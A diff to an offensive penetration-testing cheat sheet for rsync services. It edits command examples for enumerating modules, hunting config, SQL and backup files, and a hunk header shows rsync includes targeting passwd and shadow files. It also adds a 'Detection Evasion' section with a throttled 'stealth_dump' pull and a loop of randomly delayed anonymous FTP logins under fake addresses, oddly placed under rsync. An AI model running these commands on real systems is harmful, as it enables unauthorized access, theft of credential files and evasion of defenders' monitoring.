@@ -65,7 +65,13 @@
 
 ### Module Enumeration
 * Detailed module information: `rsync -av --list-only <target_ip>::<module_name>`
-* Test common modules: `for module in backup home www data etc opt var; do echo "Testing module: $module"; rsync --list-only <target_ip>::$module 2>/dev/null; done`
+* Test common modules
+  ```bash
+  for module in backup home www data etc opt var; do
+    echo "Testing module: $module"
+    rsync --list-only <target_ip>::$module 2>/dev/null
+  done
+  ```
 
 ### File Type Hunting
 * Search for specific valuable file types: `rsync -avz --list-only <target_ip>::<module>/ \| grep -E '\.(conf\|cfg\|ini\|bak\|sql\|log)$'`
@@ -91,11 +97,18 @@ rsync -avz --include="*passwd*" --include="*shadow*" --include="*config*" \
 ## Detection Evasion & Operational Security
 
 ### Traffic Obfuscation
-
-| Technique | Command Example |
-|-----------|-----------------|
-| Bandwidth limiting | `rsync -avz --bwlimit=50 --delay-updates <target>::<module>/ ./stealth_dump` |
-| Randomized delays | `sleep $((RANDOM % 300 + 60))` (1-6 minute random delay) |
+* Bandwidth limiting: `rsync -avz --bwlimit=50 --delay-updates <target>::<module>/ ./stealth_dump`
+* Randomized connection intervals
+  ```bash
+  for i in {1..10}; do
+    sleep $((RANDOM % 300 + 60))  # Random delay 1-6 minutes
+    ftp -n <target> <<EOF
+  user anonymous anonymous@$(date +%s)@fake.com
+  ls
+  quit
+  EOF
+  done
+  ```
 
 ### Log Evasion
 
